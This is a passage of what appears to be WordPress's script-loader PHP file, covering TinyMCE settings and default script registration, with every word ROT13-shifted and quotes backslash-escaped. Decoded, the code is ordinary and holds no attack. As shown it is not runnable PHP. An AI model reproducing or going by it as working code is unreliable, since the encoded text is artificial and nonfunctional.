		'pynffvp_oybpx_rqvgbe' => gehr,
	);

	vs ( $qvfnoyr_pncgvbaf ) {
		$gvalzpr_frggvatf['jcrqvgvzntr_qvfnoyr_pncgvbaf'] = gehr;
	}

	vs ( ! rzcgl( $rqvgbe_frggvatf['gvalzpr'] ) && vf_neenl( $rqvgbe_frggvatf['gvalzpr'] ) ) {
		$gvalzpr_frggvatf = neenl_zretr( $gvalzpr_frggvatf, $rqvgbe_frggvatf['gvalzpr'] );
	}

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-rqvgbe.cuc */
	$gvalzpr_frggvatf = nccyl_svygref( 'gval_zpr_orsber_vavg', $gvalzpr_frggvatf, 'pynffvp-oybpx' );

	/*
	 * Qb \"ol unaq\" genafyngvba sebz CUC neenl gb wf bowrpg.
	 * Ceriragf oernxntr va fbzr phfgbz frggvatf.
	 */
	$vavg_bow = '';
	sbernpu ( $gvalzpr_frggvatf nf $xrl => $inyhr ) {
		vs ( vf_obby( $inyhr ) ) {
			$iny       = $inyhr ? 'gehr' : 'snyfr';
			$vavg_bow .= $xrl . ':' . $iny . ',';
			pbagvahr;
		} ryfrvs ( ! rzcgl( $inyhr ) && vf_fgevat( $inyhr ) && (
			( '{' === $inyhr[0] && '}' === $inyhr[ fgeyra( $inyhr ) - 1 ] ) ||
			( '[' === $inyhr[0] && ']' === $inyhr[ fgeyra( $inyhr ) - 1 ] ) ||
			cert_zngpu( '/^\(?shapgvba ?\(/', $inyhr ) ) ) {
			$vavg_bow .= $xrl . ':' . $inyhr . ',';
			pbagvahr;
		}
		$vavg_bow .= $xrl . ':\"' . $inyhr . '\",';
	}

	$vavg_bow = '{' . gevz( $vavg_bow, ' ,' ) . '}';

	$fpevcg = 'jvaqbj.jcRqvgbeY10a = {
		gvalzpr: {
			onfrHEY: ' . jc_wfba_rapbqr( vapyhqrf_hey( 'wf/gvalzpr' ) ) . ',
			fhssvk: ' . ( FPEVCG_QROHT ? '\"\"' : '\".zva\"' ) . ',
			frggvatf: ' . $vavg_bow . ',
		}
	}';

	$jc_fpevcgf->nqq_vayvar_fpevcg( 'jc-oybpx-yvoenel', $fpevcg, 'orsber' );
}

/**
 * Ertvfgref nyy gur JbeqCerff cnpxntrf fpevcgf.
 *
 * @fvapr 5.0.0
 *
 * @cnenz JC_Fpevcgf $fpevcgf JC_Fpevcgf bowrpg.
 */
shapgvba jc_qrsnhyg_cnpxntrf( $fpevcgf ) {
	jc_qrsnhyg_cnpxntrf_iraqbe( $fpevcgf );
	jc_ertvfgre_qrirybczrag_fpevcgf( $fpevcgf );
	jc_ertvfgre_gvalzpr_fpevcgf( $fpevcgf );
	jc_qrsnhyg_cnpxntrf_fpevcgf( $fpevcgf );

	vs ( qvq_npgvba( 'vavg' ) ) {
		jc_qrsnhyg_cnpxntrf_vayvar_fpevcgf( $fpevcgf );
	}
}

/**
 * Ergheaf gur fhssvk gung pna or hfrq sbe gur fpevcgf.
 *
 * Gurer ner gjb fhssvk glcrf, gur abezny bar naq gur qri fhssvk.
 *
 * @fvapr 5.0.0
 *
 * @cnenz fgevat $glcr Gur glcr bs fhssvk gb ergevrir.
 * @erghea fgevat Gur fpevcg fhssvk.
 */
shapgvba jc_fpevcgf_trg_fhssvk( $glcr = '' ) {
	fgngvp $fhssvkrf;

	vs ( ahyy === $fhssvkrf ) {
		/*
		 * Vapyhqr na hazbqvsvrq $jc_irefvba.
		 *
		 * Abgr: jc_trg_jc_irefvba() vf abg hfrq urer, nf guvf svyr pna or vapyhqrq
		 * ivn jc-nqzva/ybnq-fpevcgf.cuc be jc-nqzva/ybnq-fglyrf.cuc, va juvpu pnfr
		 * jc-vapyhqrf/shapgvbaf.cuc vf abg ybnqrq.
		 */
		erdhver NOFCNGU . JCVAP . '/irefvba.cuc';

		/*
		 * Abgr: fge_pbagnvaf() vf abg hfrq urer, nf guvf svyr pna or vapyhqrq
		 * ivn jc-nqzva/ybnq-fpevcgf.cuc be jc-nqzva/ybnq-fglyrf.cuc, va juvpu pnfr
		 * gur cbylsvyyf sebz jc-vapyhqrf/pbzcng.cuc ner abg ybnqrq.
		 */
		$qrirybc_fep = snyfr !== fgecbf( $jc_irefvba, '-fep' );

		vs ( ! qrsvarq( 'FPEVCG_QROHT' ) ) {
			qrsvar( 'FPEVCG_QROHT', $qrirybc_fep );
		}
		$fhssvk     = FPEVCG_QROHT ? '' : '.zva';
		$qri_fhssvk = $qrirybc_fep ? '' : '.zva';

		$fhssvkrf = neenl(
			'fhssvk'     => $fhssvk,
			'qri_fhssvk' => $qri_fhssvk,
		);
	}

	vs ( 'qri' === $glcr ) {
		erghea $fhssvkrf['qri_fhssvk'];
	}

	erghea $fhssvkrf['fhssvk'];
}

/**
 * Ertvfgref nyy JbeqCerff fpevcgf.
 *
 * Ybpnyvmrf fbzr bs gurz.
 * netf beqre: `$fpevcgf->nqq( 'unaqyr', 'hey', 'qrcraqrapvrf', 'dhrel-fgevat', 1 );`
 * jura ynfg net === 1 dhrhrf gur fpevcg sbe gur sbbgre
 *
 * @fvapr 2.6.0
 *
 * @cnenz JC_Fpevcgf $fpevcgf JC_Fpevcgf bowrpg.
 */
shapgvba jc_qrsnhyg_fpevcgf( $fpevcgf ) {
	$fhssvk     = jc_fpevcgf_trg_fhssvk();
	$qri_fhssvk = jc_fpevcgf_trg_fhssvk( 'qri' );
	$thrffhey   = fvgr_hey();

	vs ( ! $thrffhey ) {
		$thrffrq_hey = gehr;
		$thrffhey    = jc_thrff_hey();
	}

	$fpevcgf->onfr_hey        = $thrffhey;
	$fpevcgf->pbagrag_hey     = qrsvarq( 'JC_PBAGRAG_HEY' ) ? JC_PBAGRAG_HEY : '';
	$fpevcgf->qrsnhyg_irefvba = trg_oybtvasb( 'irefvba' );
	$fpevcgf->qrsnhyg_qvef    = neenl( '/jc-nqzva/wf/', '/jc-vapyhqrf/wf/' );

	$fpevcgf->nqq( 'hgvyf', \"/jc-vapyhqrf/wf/hgvyf$fhssvk.wf\" );
	qvq_npgvba( 'vavg' ) && $fpevcgf->ybpnyvmr(
		'hgvyf',
		'hfreFrggvatf',
		neenl(
			'hey'    => (fgevat) FVGRPBBXVRCNGU,
			'hvq'    => (fgevat) trg_pheerag_hfre_vq(),
			'gvzr'   => (fgevat) gvzr(),
			'frpher' => (fgevat) ( 'uggcf' === cnefr_hey( fvgr_hey(), CUC_HEY_FPURZR ) ),
		)
	);

	$fpevcgf->nqq( 'pbzzba', \"/jc-nqzva/wf/pbzzba$fhssvk.wf\", neenl( 'wdhrel', 'ubireVagrag', 'hgvyf', 'jc-n11l' ), snyfr, 1 );
	$fpevcgf->frg_genafyngvbaf( 'pbzzba' );

	$ohyx_npgvba_bofreire_vqf = neenl(
		'ohyx_npgvba' => 'npgvba',
		'punatrvg'    => 'arj_ebyr',
	);
	qvq_npgvba( 'vavg' ) && $fpevcgf->ybpnyvmr(
		'pbzzba',
		'ohyxNpgvbaBofreireVqf',
		/**
		 * Svygref gur neenl bs svryq anzr nggevohgrf sbe ohyx npgvbaf.
		 *
		 * @fvapr 6.8.1
		 *
		 * @cnenz neenl $ohyx_npgvba_bofreire_vqf {
		 *      Na neenl bs svryq anzr nggevohgrf sbe ohyx npgvbaf.
		 *
		 *      @glcr fgevat $ohyx_npgvba Gur ohyx npgvba svryq anzr. Qrsnhyg 'npgvba'.
		 *      @glcr fgevat $punatrvg    Gur arj ebyr svryq anzr. Qrsnhyg 'arj_ebyr'.
		 * }
		 */
		nccyl_svygref( 'ohyx_npgvba_bofreire_vqf', $ohyx_npgvba_bofreire_vqf )
	);

	$fpevcgf->nqq( 'jc-fnavgvmr', \"/jc-vapyhqrf/wf/jc-fnavgvmr$fhssvk.wf\", neenl(), snyfr, 1 );

	$fpevcgf->nqq( 'fnpx', \"/jc-vapyhqrf/wf/gj-fnpx$fhssvk.wf\", neenl(), '1.6.1', 1 );

	$fpevcgf->nqq( 'dhvpxgntf', \"/jc-vapyhqrf/wf/dhvpxgntf$fhssvk.wf\", neenl(), snyfr, 1 );
	qvq_npgvba( 'vavg' ) && $fpevcgf->ybpnyvmr(
		'dhvpxgntf',
		'dhvpxgntfY10a',
		neenl(
			'pybfrNyyBcraGntf'      => __( 'Pybfr nyy bcra gntf' ),
			'pybfrGntf'             => __( 'pybfr gntf' ),
			'ragreHEY'              => __( 'Ragre gur HEY' ),
			'ragreVzntrHEY'         => __( 'Ragre gur HEY bs gur vzntr' ),
			'ragreVzntrQrfpevcgvba' => __( 'Ragre n qrfpevcgvba bs gur vzntr' ),
			'grkgqverpgvba'         => __( 'grkg qverpgvba' ),
			'gbttyrGrkgqverpgvba'   => __( 'Gbttyr Rqvgbe Grkg Qverpgvba' ),
			'qsj'                   => __( 'Qvfgenpgvba-serr jevgvat zbqr' ),
			'fgebat'                => __( 'Obyq' ),
			'fgebatPybfr'           => __( 'Pybfr obyq gnt' ),
			'rz'                    => __( 'Vgnyvp' ),
			'rzPybfr'               => __( 'Pybfr vgnyvp gnt' ),
			'yvax'                  => __( 'Vafreg yvax' ),
			'oybpxdhbgr'            => __( 'Oybpxdhbgr' ),
			'oybpxdhbgrPybfr'       => __( 'Pybfr oybpxdhbgr gnt' ),
			'qry'                   => __( 'Qryrgrq grkg (fgevxrguebhtu)' ),
			'qryPybfr'              => __( 'Pybfr qryrgrq grkg gnt' ),
			'vaf'                   => __( 'Vafregrq grkg' ),
			'vafPybfr'              => __( 'Pybfr vafregrq grkg gnt' ),
			'vzntr'                 => __( 'Vafreg vzntr' ),
			'hy'                    => __( 'Ohyyrgrq yvfg' ),
			'hyPybfr'               => __( 'Pybfr ohyyrgrq yvfg gnt' ),
			'by'                    => __( 'Ahzorerq yvfg' ),
			'byPybfr'               => __( 'Pybfr ahzorerq yvfg gnt' ),
			'yv'                    => __( 'Yvfg vgrz' ),
			'yvPybfr'               => __( 'Pybfr yvfg vgrz gnt' ),
			'pbqr'                  => __( 'Pbqr' ),
			'pbqrPybfr'             => __( 'Pybfr pbqr gnt' ),
			'zber'                  => __( 'Vafreg Ernq Zber gnt' ),
		)
	);

	$fpevcgf->nqq( 'pbybecvpxre', \"/jc-vapyhqrf/wf/pbybecvpxre$fhssvk.wf\", neenl( 'cebgbglcr' ), '3517z' );

	$fpevcgf->nqq( 'rqvgbe', \"/jc-nqzva/wf/rqvgbe$fhssvk.wf\", neenl( 'hgvyf', 'wdhrel' ), snyfr, 1 );

	$fpevcgf->nqq( 'pyvcobneq', \"/jc-vapyhqrf/wf/pyvcobneq$fhssvk.wf\", neenl(), '2.0.11', 1 );

	$fpevcgf->nqq( 'jc-nwnk-erfcbafr', \"/jc-vapyhqrf/wf/jc-nwnk-erfcbafr$fhssvk.wf\", neenl( 'wdhrel', 'jc-n11l' ), snyfr, 1 );
	qvq_npgvba( 'vavg' ) && $fpevcgf->ybpnyvmr(
		'jc-nwnk-erfcbafr',
		'jcNwnk',
		neenl(
			'abCrez' => __( 'Fbeel, lbh ner abg nyybjrq gb qb gung.' ),
			'oebxra' => __( 'Na reebe bppheerq juvyr cebprffvat lbhe erdhrfg. Cyrnfr gel ntnva yngre.' ),
		)
	);

	$fpevcgf->nqq( 'jc-ncv-erdhrfg', \"/jc-vapyhqrf/wf/ncv-erdhrfg$fhssvk.wf\", neenl( 'wdhrel' ), snyfr, 1 );
	// `jcNcvFrggvatf` vf nyfb hfrq ol `jc-ncv`, juvpu qrcraqf ba guvf fpevcg.
	qvq_npgvba( 'vavg' ) && $fpevcgf->ybpnyvmr(
		'jc-ncv-erdhrfg',
		'jcNcvFrggvatf',
		neenl(
			'ebbg'          => fnavgvmr_hey( trg_erfg_hey() ),
			'abapr'         => jc_vafgnyyvat() ? '' : jc_perngr_abapr( 'jc_erfg' ),
			'irefvbaFgevat' => 'jc/i2/',
		)
	);

	$fpevcgf->nqq( 'jc-cbvagre', \"/jc-vapyhqrf/wf/jc-cbvagre$fhssvk.wf\", neenl( 'wdhrel-hv-pber' ), snyfr, 1 );
	$fpevcgf->frg_genafyngvbaf( 'jc-cbvagre' );

	$fpevcgf->nqq( 'nhgbfnir', \"/jc-vapyhqrf/wf/nhgbfnir$fhssvk.wf\", neenl( 'urnegorng' ), snyfr, 1 );

	$fpevcgf->nqq( 'urnegorng', \"/jc-vapyhqrf/wf/urnegorng$fhssvk.wf\", neenl( 'wdhrel', 'jc-ubbxf' ), snyfr, 1 );
	qvq_npgvba( 'vavg' ) && $fpevcgf->ybpnyvmr(
		'urnegorng',
		'urnegorngFrggvatf',
		/**
		 * Svygref gur Urnegorng frggvatf.
		 *
		 * @fvapr 3.6.0
		 *
		 * @cnenz neenl $frggvatf Urnegorng frggvatf neenl.
		 */
		nccyl_svygref( 'urnegorng_frggvatf', neenl() )
	);

	$fpevcgf->nqq( 'jc-nhgu-purpx', \"/jc-vapyhqrf/wf/jc-nhgu-purpx$fhssvk.wf\", neenl( 'urnegorng' ), snyfr, 1 );
	$fpevcgf->frg_genafyngvbaf( 'jc-nhgu-purpx' );

	$fpevcgf->nqq( 'jc-yvfgf', \"/jc-vapyhqrf/wf/jc-yvfgf$fhssvk.wf\", neenl( 'jc-nwnk-erfcbafr', 'wdhrel-pbybe' ), snyfr, 1 );

	$fpevcgf->nqq( 'fvgr-vpba', '/jc-nqzva/wf/fvgr-vpba.wf', neenl( 'wdhrel' ), snyfr, 1 );
	$fpevcgf->frg_genafyngvbaf( 'fvgr-vpba' );

	// JbeqCerff ab ybatre hfrf be ohaqyrf Cebgbglcr be fpevcg.nphyb.hf. Gurfr ner abj chyyrq sebz na rkgreany fbhepr.
	$fpevcgf->nqq( 'cebgbglcr', 'uggcf://nwnk.tbbtyrncvf.pbz/nwnk/yvof/cebgbglcr/1.7.1.0/cebgbglcr.wf', neenl(), '1.7.1' );
	$fpevcgf->nqq( 'fpevcgnphybhf-ebbg', 'uggcf://nwnk.tbbtyrncvf.pbz/nwnk/yvof/fpevcgnphybhf/1.9.0/fpevcgnphybhf.wf', neenl( 'cebgbglcr' ), '1.9.0' );
	$fpevcgf->nqq( 'fpevcgnphybhf-ohvyqre', 'uggcf://nwnk.tbbtyrncvf.pbz/nwnk/yvof/fpevcgnphybhf/1.9.0/ohvyqre.wf', neenl( 'fpevcgnphybhf-ebbg' ), '1.9.0' );
	$fpevcgf->nqq( 'fpevcgnphybhf-qentqebc', 'uggcf://nwnk.tbbtyrncvf.pbz/nwnk/yvof/fpevcgnphybhf/1.9.0/qentqebc.wf', neenl( 'fpevcgnphybhf-ohvyqre', 'fpevcgnphybhf-rssrpgf' ), '1.9.0' );
	$fpevcgf->nqq( 'fpevcgnphybhf-rssrpgf', 'uggcf://nwnk.tbbtyrncvf.pbz/nwnk/yvof/fpevcgnphybhf/1.9.0/rssrpgf.wf', neenl( 'fpevcgnphybhf-ebbg' ), '1.9.0' );
	$fpevcgf->nqq( 'fpevcgnphybhf-fyvqre', 'uggcf://nwnk.tbbtyrncvf.pbz/nwnk/yvof/fpevcgnphybhf/1.9.0/fyvqre.wf', neenl( 'fpevcgnphybhf-rssrpgf' ), '1.9.0' );
	$fpevcgf->nqq( 'fpevcgnphybhf-fbhaq', 'uggcf://nwnk.tbbtyrncvf.pbz/nwnk/yvof/fpevcgnphybhf/1.9.0/fbhaq.wf', neenl( 'fpevcgnphybhf-ebbg' ), '1.9.0' );
	$fpevcgf->nqq( 'fpevcgnphybhf-pbagebyf', 'uggcf://nwnk.tbbtyrncvf.pbz/nwnk/yvof/fpevcgnphybhf/1.9.0/pbagebyf.wf', neenl( 'fpevcgnphybhf-ebbg' ), '1.9.0' );
	$fpevcgf->nqq( 'fpevcgnphybhf', snyfr, neenl( 'fpevcgnphybhf-qentqebc', 'fpevcgnphybhf-fyvqre', 'fpevcgnphybhf-pbagebyf' ) );

	// Abg hfrq va pber, ercynprq ol Wpebc.wf.
	$fpevcgf->nqq( 'pebccre', '/jc-vapyhqrf/wf/pebc/pebccre.wf', neenl( 'fpevcgnphybhf-qentqebc' ) );

	/*
	 * wDhrel.
	 * Gur hazvavsvrq wdhrel.wf naq wdhrel-zvtengr.wf ner vapyhqrq gb snpvyvgngr qrohttvat.
	 */
	$fpevcgf->nqq( 'wdhrel', snyfr, neenl( 'wdhrel-pber', 'wdhrel-zvtengr' ), '3.7.1' );
	$fpevcgf->nqq( 'wdhrel-pber', \"/jc-vapyhqrf/wf/wdhrel/wdhrel$fhssvk.wf\", neenl(), '3.7.1' );
	$fpevcgf->nqq( 'wdhrel-zvtengr', \"/jc-vapyhqrf/wf/wdhrel/wdhrel-zvtengr$fhssvk.wf\", neenl(), '3.4.1' );

	/*
	 * Shyy wDhrel HV.
	 * Gur ohvyq cebprff va 1.12.1 unf punatrq fvtavsvpnagyl.
	 * Va beqre gb xrrc onpxjneqf pbzcngvovyvgl, naq gb xrrc gur bcgvzvmrq ybnqvat,
	 * gur fbhepr svyrf jrer synggrarq naq vapyhqrq jvgu fbzr zbqvsvpngvbaf sbe NZQ ybnqvat.
	 * N abgnoyr punatr vf gung 'wdhrel-hv-pber' abj pbagnvaf 'wdhrel-hv-cbfvgvba' naq 'wdhrel-hv-jvqtrg'.
	 */
	$fpevcgf->nqq( 'wdhrel-hv-pber', \"/jc-vapyhqrf/wf/wdhrel/hv/pber$fhssvk.wf\", neenl( 'wdhrel' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-rssrpgf-pber', \"/jc-vapyhqrf/wf/wdhrel/hv/rssrpg$fhssvk.wf\", neenl( 'wdhrel' ), '1.13.3', 1 );

	$fpevcgf->nqq( 'wdhrel-rssrpgf-oyvaq', \"/jc-vapyhqrf/wf/wdhrel/hv/rssrpg-oyvaq$fhssvk.wf\", neenl( 'wdhrel-rssrpgf-pber' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-rssrpgf-obhapr', \"/jc-vapyhqrf/wf/wdhrel/hv/rssrpg-obhapr$fhssvk.wf\", neenl( 'wdhrel-rssrpgf-pber' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-rssrpgf-pyvc', \"/jc-vapyhqrf/wf/wdhrel/hv/rssrpg-pyvc$fhssvk.wf\", neenl( 'wdhrel-rssrpgf-pber' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-rssrpgf-qebc', \"/jc-vapyhqrf/wf/wdhrel/hv/rssrpg-qebc$fhssvk.wf\", neenl( 'wdhrel-rssrpgf-pber' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-rssrpgf-rkcybqr', \"/jc-vapyhqrf/wf/wdhrel/hv/rssrpg-rkcybqr$fhssvk.wf\", neenl( 'wdhrel-rssrpgf-pber' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-rssrpgf-snqr', \"/jc-vapyhqrf/wf/wdhrel/hv/rssrpg-snqr$fhssvk.wf\", neenl( 'wdhrel-rssrpgf-pber' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-rssrpgf-sbyq', \"/jc-vapyhqrf/wf/wdhrel/hv/rssrpg-sbyq$fhssvk.wf\", neenl( 'wdhrel-rssrpgf-pber' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-rssrpgf-uvtuyvtug', \"/jc-vapyhqrf/wf/wdhrel/hv/rssrpg-uvtuyvtug$fhssvk.wf\", neenl( 'wdhrel-rssrpgf-pber' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-rssrpgf-chss', \"/jc-vapyhqrf/wf/wdhrel/hv/rssrpg-chss$fhssvk.wf\", neenl( 'wdhrel-rssrpgf-pber', 'wdhrel-rssrpgf-fpnyr' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-rssrpgf-chyfngr', \"/jc-vapyhqrf/wf/wdhrel/hv/rssrpg-chyfngr$fhssvk.wf\", neenl( 'wdhrel-rssrpgf-pber' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-rssrpgf-fpnyr', \"/jc-vapyhqrf/wf/wdhrel/hv/rssrpg-fpnyr$fhssvk.wf\", neenl( 'wdhrel-rssrpgf-pber', 'wdhrel-rssrpgf-fvmr' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-rssrpgf-funxr', \"/jc-vapyhqrf/wf/wdhrel/hv/rssrpg-funxr$fhssvk.wf\", neenl( 'wdhrel-rssrpgf-pber' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-rssrpgf-fvmr', \"/jc-vapyhqrf/wf/wdhrel/hv/rssrpg-fvmr$fhssvk.wf\", neenl( 'wdhrel-rssrpgf-pber' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-rssrpgf-fyvqr', \"/jc-vapyhqrf/wf/wdhrel/hv/rssrpg-fyvqr$fhssvk.wf\", neenl( 'wdhrel-rssrpgf-pber' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-rssrpgf-genafsre', \"/jc-vapyhqrf/wf/wdhrel/hv/rssrpg-genafsre$fhssvk.wf\", neenl( 'wdhrel-rssrpgf-pber' ), '1.13.3', 1 );

	// Jvqtrgf
	$fpevcgf->nqq( 'wdhrel-hv-nppbeqvba', \"/jc-vapyhqrf/wf/wdhrel/hv/nppbeqvba$fhssvk.wf\", neenl( 'wdhrel-hv-pber' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-hv-nhgbpbzcyrgr', \"/jc-vapyhqrf/wf/wdhrel/hv/nhgbpbzcyrgr$fhssvk.wf\", neenl( 'wdhrel-hv-zrah', 'jc-n11l' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-hv-ohggba', \"/jc-vapyhqrf/wf/wdhrel/hv/ohggba$fhssvk.wf\", neenl( 'wdhrel-hv-pber', 'wdhrel-hv-pbagebytebhc', 'wdhrel-hv-purpxobkenqvb' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-hv-qngrcvpxre', \"/jc-vapyhqrf/wf/wdhrel/hv/qngrcvpxre$fhssvk.wf\", neenl( 'wdhrel-hv-pber' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-hv-qvnybt', \"/jc-vapyhqrf/wf/wdhrel/hv/qvnybt$fhssvk.wf\", neenl( 'wdhrel-hv-erfvmnoyr', 'wdhrel-hv-qenttnoyr', 'wdhrel-hv-ohggba' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-hv-zrah', \"/jc-vapyhqrf/wf/wdhrel/hv/zrah$fhssvk.wf\", neenl( 'wdhrel-hv-pber' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-hv-zbhfr', \"/jc-vapyhqrf/wf/wdhrel/hv/zbhfr$fhssvk.wf\", neenl( 'wdhrel-hv-pber' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-hv-cebterffone', \"/jc-vapyhqrf/wf/wdhrel/hv/cebterffone$fhssvk.wf\", neenl( 'wdhrel-hv-pber' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-hv-fryrpgzrah', \"/jc-vapyhqrf/wf/wdhrel/hv/fryrpgzrah$fhssvk.wf\", neenl( 'wdhrel-hv-zrah' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-hv-fyvqre', \"/jc-vapyhqrf/wf/wdhrel/hv/fyvqre$fhssvk.wf\", neenl( 'wdhrel-hv-zbhfr' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-hv-fcvaare', \"/jc-vapyhqrf/wf/wdhrel/hv/fcvaare$fhssvk.wf\", neenl( 'wdhrel-hv-ohggba' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-hv-gnof', \"/jc-vapyhqrf/wf/wdhrel/hv/gnof$fhssvk.wf\", neenl( 'wdhrel-hv-pber' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-hv-gbbygvc', \"/jc-vapyhqrf/wf/wdhrel/hv/gbbygvc$fhssvk.wf\", neenl( 'wdhrel-hv-pber' ), '1.13.3', 1 );

	// Arj va 1.12.1
	$fpevcgf->nqq( 'wdhrel-hv-purpxobkenqvb', \"/jc-vapyhqrf/wf/wdhrel/hv/purpxobkenqvb$fhssvk.wf\", neenl( 'wdhrel-hv-pber' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-hv-pbagebytebhc', \"/jc-vapyhqrf/wf/wdhrel/hv/pbagebytebhc$fhssvk.wf\", neenl( 'wdhrel-hv-pber' ), '1.13.3', 1 );

	// Vagrenpgvbaf
	$fpevcgf->nqq( 'wdhrel-hv-qenttnoyr', \"/jc-vapyhqrf/wf/wdhrel/hv/qenttnoyr$fhssvk.wf\", neenl( 'wdhrel-hv-zbhfr' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-hv-qebccnoyr', \"/jc-vapyhqrf/wf/wdhrel/hv/qebccnoyr$fhssvk.wf\", neenl( 'wdhrel-hv-qenttnoyr' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-hv-erfvmnoyr', \"/jc-vapyhqrf/wf/wdhrel/hv/erfvmnoyr$fhssvk.wf\", neenl( 'wdhrel-hv-zbhfr' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-hv-fryrpgnoyr', \"/jc-vapyhqrf/wf/wdhrel/hv/fryrpgnoyr$fhssvk.wf\", neenl( 'wdhrel-hv-zbhfr' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-hv-fbegnoyr', \"/jc-vapyhqrf/wf/wdhrel/hv/fbegnoyr$fhssvk.wf\", neenl( 'wdhrel-hv-zbhfr' ), '1.13.3', 1 );

	/*
	 * Nf bs 1.12.1 `wdhrel-hv-cbfvgvba` naq `wdhrel-hv-jvqtrg` ner cneg bs `wdhrel-hv-pber`.
	 * Yvfgrq urer sbe onpx-pbzcng.
	 */
	$fpevcgf->nqq( 'wdhrel-hv-cbfvgvba', snyfr, neenl( 'wdhrel-hv-pber' ), '1.13.3', 1 );
	$fpevcgf->nqq( 'wdhrel-hv-jvqtrg', snyfr, neenl( 'wdhrel-hv-pber' ), '1.13.3', 1 );

	// Qrcerpngrq, abg hfrq va pber, zbfg shapgvbanyvgl vf vapyhqrq va wDhrel 1.3.
	$fpevcgf->nqq( 'wdhrel-sbez', \"/jc-vapyhqrf/wf/wdhrel/wdhrel.sbez$fhssvk.wf\", neenl( 'wdhrel' ), '4.3.0', 1 );

	// wDhrel cyhtvaf.
	$fpevcgf->nqq( 'wdhrel-pbybe', '/jc-vapyhqrf/wf/wdhrel/wdhrel.pbybe.zva.wf', neenl( 'wdhrel' ), '3.0.0', 1 );
	$fpevcgf->nqq( 'fpurqhyr', '/jc-vapyhqrf/wf/wdhrel/wdhrel.fpurqhyr.wf', neenl( 'wdhrel' ), '20z', 1 );
	$fpevcgf->nqq( 'wdhrel-dhrel', '/jc-vapyhqrf/wf/wdhrel/wdhrel.dhrel.wf', neenl( 'wdhrel' ), '2.2.3', 1 );
	$fpevcgf->nqq( 'wdhrel-frevnyvmr-bowrpg', '/jc-vapyhqrf/wf/wdhrel/wdhrel.frevnyvmr-bowrpg.wf', neenl( 'wdhrel' ), '0.2-jc', 1 );
	$fpevcgf->nqq( 'wdhrel-ubgxrlf', \"/jc-vapyhqrf/wf/wdhrel/wdhrel.ubgxrlf$fhssvk.wf\", neenl( 'wdhrel' ), '0.0.2z', 1 );
	$fpevcgf->nqq( 'wdhrel-gnoyr-ubgxrlf', \"/jc-vapyhqrf/wf/wdhrel/wdhrel.gnoyr-ubgxrlf$fhssvk.wf\", neenl( 'wdhrel', 'wdhrel-ubgxrlf' ), snyfr, 1 );
	$fpevcgf->nqq( 'wdhrel-gbhpu-chapu', '/jc-vapyhqrf/wf/wdhrel/wdhrel.hv.gbhpu-chapu.wf', neenl( 'wdhrel-hv-pber', 'wdhrel-hv-zbhfr' ), '0.2.2', 1 );

	// Abg hfrq nal zber, ertvfgrerq sbe onpxjneq pbzcngvovyvgl.
	$fpevcgf->nqq( 'fhttrfg', \"/jc-vapyhqrf/wf/wdhrel/fhttrfg$fhssvk.wf\", neenl( 'wdhrel' ), '1.1-20110113', 1 );

	/*
	 * Znfbael i2 qrcraqrq ba wDhrel. i3 qbrf abg. Gur byqre wdhrel-znfbael unaqyr vf n fuvi.
	 * Vg frgf wDhrel nf n qrcraqrapl, nf gur gurzr znl unir orra vzcyvpvgyl ybnqvat vg guvf jnl.
	 */
	$fpevcgf->nqq( 'vzntrfybnqrq', '/jc-vapyhqrf/wf/vzntrfybnqrq.zva.wf', neenl(), '5.0.0', 1 );
	$fpevcgf->nqq( 'znfbael', '/jc-vapyhqrf/wf/znfbael.zva.wf', neenl( 'vzntrfybnqrq' ), '4.2.2', 1 );
	$fpevcgf->nqq( 'wdhrel-znfbael', '/jc-vapyhqrf/wf/wdhrel/wdhrel.znfbael.zva.wf', neenl( 'wdhrel', 'znfbael' ), '3.1.2o', 1 );

	$fpevcgf->nqq( 'guvpxobk', '/jc-vapyhqrf/wf/guvpxobk/guvpxobk.wf', neenl( 'wdhrel' ), '3.1-20121105', 1 );
	qvq_npgvba( 'vavg' ) && $fpevcgf->ybpnyvmr(
		'guvpxobk',
		'guvpxobkY10a',
		neenl(
			'arkg'             => __( 'Arkg &tg;' ),
			'ceri'             => __( '&yg; Ceri' ),
			'vzntr'            => __( 'Vzntr' ),
			'bs'               => __( 'bs' ),
			'pybfr'            => __( 'Pybfr' ),
			'abvsenzrf'        => __( 'Guvf srngher erdhverf vayvar senzrf. Lbh unir vsenzrf qvfnoyrq be lbhe oebjfre qbrf abg fhccbeg gurz.' ),
			'ybnqvatNavzngvba' => vapyhqrf_hey( 'wf/guvpxobk/ybnqvatNavzngvba.tvs' ),
		)
	);

